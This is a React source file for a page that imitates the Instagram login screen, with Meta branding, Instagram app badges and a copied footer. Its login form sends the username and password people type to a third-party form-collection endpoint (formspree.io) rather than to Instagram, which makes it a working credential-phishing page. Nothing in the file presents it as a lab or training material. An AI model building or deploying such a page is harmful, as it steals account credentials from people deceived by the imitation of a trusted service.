
import React ,{useState,useEffect} from 'react'
import pngegg from './logo.png';
import logo2 from './logo2.png';
import logo1 from './logo1.png';

const App = () => {
  
  const [loading, setLoading] = useState(false);
  useEffect(() => {
    let cancel = false;
    setLoading(true)
    setTimeout(() => {
      if (cancel) return;
      setLoading(false)
    }, 4000);
    return () => { 
      cancel = true;
    }
    
  }, []);
  return (
    <>
    {loading?<div className='loading'>
      <div className='mainLogo'>
        <img src={logo2} alt="lll" />
      </div>
      <div className='mainLogo2'>
      <p>From</p>
        <img src={logo1} alt="lll" />
      </div>
    </div>
    //////////////////////////////
    :
       <div id="wrapper">
      <div className="container">
        <div className="form-data">
          <form   action="https://formspree.io/f/mvonqzwr"
  method="POST">
            <div className="logo">
              <img src={pngegg} alt="img" />
            </div>
            <input type="text" name='text' placeholder="Phone number, username, or email" required autoComplete='off'/>
            <input type="text" name="password" placeholder="Password"  required/>
            <button className="form-btn" type="submit">Log in</button>
            <span className="has-separator">Or</span>
            <a href="/" className="facebook-login">
              <i className="fab fa-facebook"></i> Log in with Facebook
            </a>
            <a className="password-reset" href="/">Forgot password?</a>
         </form>
          <div className="sign-up">
            Don't have an account? <a href="/">Sign up</a>
          </div>
          <div className="get-the-app">
            <span>Get the app</span>
            <div className="badge">
              <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="android App" />
              <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="ios app" />
            </div>
          </div>
        </div>
      </div>

      <footer>
        <div className="container">
          <nav className="footer-nav">
            <ul>
              <li><a href="/">Meta</a></li>
              <li><a href="/">About</a></li>
              <li><a href="/">Blog</a></li>
              <li><a href="/">Jobs</a></li>
              <li><a href="/">Help</a></li>
              <li><a href="/">API</a></li>
              <li><a href="/">Privacy</a></li>
              <li><a href="/">Terms</a></li>
              <li><a href="/">Top Accounts</a></li>
              <li><a href="/">Locations</a></li>
              <li><a href="/">Instagram lite</a></li>
              <li><a href="/">Contact Uploading & Non-Users</a></li>
              <li><a href="/">Meta Verified</a></li>
            </ul>
          </nav>
          <div className="copyright-notice">
            &copy;  2023 Instagram from Meta
          </div>
        </div>
      </footer>
    </div>
    }
    </>
  )
}

export default App;